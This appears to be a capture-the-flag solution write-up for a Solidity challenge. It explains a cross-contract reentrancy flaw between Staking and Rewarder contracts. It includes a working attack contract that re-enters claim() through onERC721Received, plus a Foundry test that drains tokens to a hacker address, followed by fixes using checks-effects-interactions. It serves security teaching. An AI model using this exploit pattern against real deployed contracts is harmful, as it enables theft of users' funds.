# NotForTrusting Solution

If your solution has to do with `Rewarder::setStaker()`'s access control:
```
require(tx.origin == admin, "you are not the admin");
```
Your answer is wrong. It was a red herring. Although that is a potential vulnerability, we can assume the admin of the protocol is responsible. Congrats on finding this bug, but there is a different solution to this challenge.


### The real solution
The actual vulnerability is a cross contract reentrancy attack. Nowadays, most developers are aware of simple reentrancy attacks. In this case, both smart contracts even have a reentrancy guard modifier on every state changing function.

Since the two smart contracts do not share the same state for the reentrancy guard modifier, they are not aware when the other contract is locked. To fix this issue, I recommend that protocols with multiple smart contracts should share the state of the reentrancy guard modifier by creating a separate smart contract that they both read and write to the state of the contract.

The basics of the rentrancey revolves around claiming twice, and taking advantage of an NFT's `safeTransforFrom()` function call to `onERC721Received()` in the receiving smart contract. We will go over the affected code in more depth later, but for now let's look into how we perform the exploit.

To exploit the vulnerability, we need a separate smart contract to perform the rentrancey. Let's take a look at my implementation of it:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import "../mocks/NFT.sol";
import "../mocks/marqToken.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { Staking, Rewarder } from "../src/6_NotForTrusting.sol";


contract Attack6 is IERC721Receiver {

    Staking staking;
    Rewarder rewarder;
    NFT nft;
    MarqToken token;
    bool attackMode;


    constructor(address _staking, address _rewarder, address _nft, address _token) {
        staking = Staking(_staking);
        rewarder = Rewarder(_rewarder);
        nft = NFT(_nft);
        token = MarqToken(_token);
    }

    function stake(uint256 _tokenId) external {
        nft.approve(address(staking), _tokenId);
        staking.stake(_tokenId, 100);
    }

    function unstake(uint256 _tokenId) external {
        staking.unstake(_tokenId, true);
    }

    function setAttackMode(bool _mode) external {
        attackMode = _mode;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if(attackMode) {
            rewarder.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function pullOutWinnings(uint256 _tokenId) external {
        nft.transferFrom(address(this), msg.sender, _tokenId);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

}
```
It's not too complex but here is a breakdown of what each function does.
- `stake`: Call `Staking` to stake the user's NFT.
- `unstake`: Call `Staking` to unstake the user's NFT
- `onERC721Received`: Necessary function to receive a NFT for a smart contract. If attack mode is set to true, it calls the claim function again.
- `setAttackMode`: Toggle's attack mode.
- `pullOutWinnings`: Sends the stolen funds to the hacker's address.

Now let's look at what I wrote in the test file:
```
function test_GetThisPassing_6() public {
    address hacker = address(0xBAD);
    
    Attack6 attack = new Attack6(address(staking), address(rewarder), address(nft), address(token));

    vm.startPrank(hacker);
    nft.transferFrom(address(hacker), address(attack), tokenId);
    attack.stake(tokenId);
    attack.setAttackMode(true);
    vm.roll(block.number + 100);
    attack.unstake(tokenId);
    attack.pullOutWinnings(tokenId);
    vm.stopPrank();

    assertGt(token.balanceOf(hacker), 1000 ether);
    assertEq(nft.ownerOf(tokenId), hacker);
}
```
Here are the steps to execute the attack:
1. Send the NFT to the attack contract.
2. Stake the NFT.
3. Set the attack contract in attack mode. Now when it receives the NFT it knows to claim again.
4. Move the block number.
5. Call unstake. This is when the reentrancy occurs.
6. Pull out the winnings.

Now let's go over why we were able to exploit a reentrancy attack. Although the `lock` modifier does not protect both smart contracts, this attack could have been avoided if the code handled state changes better.

Checks Effects Interactions (CEI) refers to a best practice programming pattern for smart contract development. In short, it refers to updating state variables before handing off the transaction flow to another smart contract. To read more on CEI [check this article out](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html).

Here is an example of the `Staking` contract's unstake function if it was written in best practice:
```
function unstake(uint256 _tokenId, bool claim) external guard {
    require(isStaking[msg.sender], "Stake first");
    StakeData memory userStake = stakeData[msg.sender];
    require(block.number >= userStake.stakeStart + userStake.stakeDuration, "patience is my least favorite virtue too");

    if(claim) {
        rewarder.claim(msg.sender);
    }

    // we update the state before transfering the NFT out of the protocol
    isStaking[msg.sender] = false;
    userStake = StakeData(0, 0, 0);

    nft.safeTransferFrom(address(this), msg.sender, _tokenId);
}
```

However, that was not the only issue with this code. `Rewarder`'s `function claim(address _for) external` has an error in it's require statements:
```
function claim(address _for) external guard {
    bool isStaking = staking.isStaking(_for);
    StakeData memory userStake = staking.getStakerData(msg.sender);
    require(msg.sender == address(staking), "not your rewards");
    require(block.number >= userStake.stakeStart + userStake.stakeDuration, "you know about vm.roll(), right?");
    // changed msg.sender to _for
    require(!hasClaimed[_for], "no double dipping");

    // changed msg.sender to _for
    hasClaimed[_for] = true;
    token.mint(1000 ether);
    token.transfer(_for, 1000 ether);
    
}
```

Because the original code is updating and checking `msg.sender` instead of `_for`, this actually blocks `Staking` from claiming again, regardless of the user.

Whenever you see a smart contract hand over flow to an external contract, you should meticulously check all possible interactions and possibilities of a reentrancy attack.

Bonus Points if you noticed that a user who has not manually claimed and does not set `claim` to true while unstaking will lose out on their rewards.
